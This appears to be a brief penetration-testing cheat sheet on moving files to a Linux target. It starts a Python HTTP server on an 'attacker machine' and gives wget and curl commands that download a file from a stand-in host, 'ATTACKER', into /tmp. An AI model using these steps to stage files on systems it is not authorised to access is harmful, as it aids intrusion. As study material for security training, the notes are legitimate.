- Linux commonly has `wget` and `curl` available for HTTP/HTTPS file transfers.

---
## Start a http Server from Attacker machine

```bash
python3 -m http.server
```

## wget
```bash
# we download the file and put it in /tmp dir with file as its name
wget http://ATTACKER/file -O /tmp/file
```

## curl
```bash
curl -o /tmp/file http://ATTACKER/file
```

## Remember 

- wget uses capital `-O` (the letter O, not zero)
- curl uses lowercase `-o`
- You can also download file directly from github with this method

